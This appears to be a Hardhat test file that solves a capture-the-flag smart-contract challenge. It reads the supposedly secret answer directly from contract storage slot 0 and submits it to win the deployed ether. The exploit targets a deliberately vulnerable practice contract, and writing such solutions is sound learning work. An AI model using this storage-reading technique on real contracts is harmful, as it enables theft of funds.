import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheRandomNumberChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheRandomNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {

    //Since the answer is stored at the first address, we can just use that.
    const answerHash = await target.provider.getStorageAt(target.address, 0);
    const answer = parseInt(answerHash);
    
    const tx = await target.guess(answer, {
      value: utils.parseEther('1')
    });

    await tx.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
